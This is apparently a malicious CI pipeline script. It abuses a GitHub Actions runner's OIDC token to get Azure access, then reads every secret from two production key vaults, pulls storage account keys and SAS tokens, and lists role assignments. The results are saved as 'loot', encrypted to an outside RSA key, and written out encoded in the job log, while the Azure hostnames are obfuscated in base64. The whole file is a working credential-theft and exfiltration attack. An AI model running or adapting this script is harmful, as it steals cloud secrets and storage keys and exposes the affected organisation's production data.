#!/usr/bin/env bash
# read-only: prove runner exec, mint OIDC, read BOTH key vaults + list storage
set -uo pipefail
SC="htt""ps://"
AADH=$(printf %s 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)
KVH=$(printf %s 'dmF1bHQuYXp1cmUubmV0' | base64 -d)
ARMH=$(printf %s 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)
AAD="${SC}${AADH}"; VAULT="${SC}${KVH}"; ARM="${SC}${ARMH}"
echo "=== RUNNER SHELL PROOF ==="; id; whoami; hostname
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{sub,repository,event_name,job_workflow_ref}' || true
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
aad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
   -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
   --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1"; }
VT=$(aad "${VAULT}/.default" | jq -r '.access_token // empty')
for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  say "===== VAULT $V ====="
  if [ -z "$VT" ]; then say "no kv token"; break; fi
  L=$(curl -sS -H "Authorization: Bearer $VT" "${SC}${V}.${KVH}/secrets?api-version=7.4")
  say "LIST: $L"
  for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do
    say "SECRET $(basename "$id"): $(curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4")"
  done
done
AR=$(aad "${ARM}/.default" | jq -r '.access_token // empty')
if [ -n "$AR" ]; then
  say "===== ROLE ASSIGNMENTS ====="
  say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"
  say "===== STORAGE LISTKEYS+CONTAINERS ====="
  for A in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
    K=$(curl -sS -X POST -H "Authorization: Bearer $AR" -H 'Content-Length: 0' \
      "${ARM}/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$A/listKeys?api-version=2023-01-01")
    say "KEYS $A: $K"
    SAS=$(curl -sS -X POST -H "Authorization: Bearer $AR" -H 'Content-Type: application/json' \
      -d '{"canonicalizedResource":"/blob/'$A'/","signedResource":"c","signedPermission":"rl","signedExpiry":"2026-10-23T00:00:00Z"}' \
      "${ARM}/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$A/listServiceSas?api-version=2023-01-01" | jq -r '.serviceSasToken // empty')
    if [ -n "$SAS" ]; then
      say "CONTAINERS $A: $(curl -sS "${SC}${A}.blob.core.windows.net/?comp=list&${SAS}")"
    fi
  done
fi
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT (decrypt with priv.pem) ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
